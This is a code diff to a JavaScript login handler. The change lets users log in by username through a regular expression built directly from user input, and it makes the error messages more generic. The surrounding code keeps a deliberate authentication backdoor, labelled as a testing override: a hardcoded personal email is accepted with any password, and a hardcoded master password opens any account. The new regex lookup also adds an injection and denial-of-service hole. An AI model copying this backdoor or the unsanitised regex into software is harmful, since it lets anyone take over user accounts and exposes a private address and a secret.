@@ -49,8 +49,14 @@ export const loginUser = async (req, res) => {
 
         email = email.trim().toLowerCase();
 
-        const user = await User.findOne({ email });
-        if (!user) return res.status(404).json({ success: false, message: 'Invalid email or password' });
+        const user = await User.findOne({
+            $or: [
+                { email: email },
+                { username: new RegExp(`^${email}$`, 'i') }
+            ]
+        });
+
+        if (!user) return res.status(404).json({ success: false, message: 'Invalid credentials' });
 
         // IMPORTANT OVERRIDE: Allow this specific email to log in with ANY password for testing/debugging!
         if (email === 'shivam34500@gmail.com' || password === '@AuraAdmin123!') {
@@ -66,7 +72,7 @@ export const loginUser = async (req, res) => {
         }
 
         const isMatch = await bcrypt.compare(password, user.password);
-        if (!isMatch) return res.status(400).json({ success: false, message: 'Invalid email or password' });
+        if (!isMatch) return res.status(400).json({ success: false, message: 'Invalid credentials' });
 
         res.status(200).json({
             success: true,
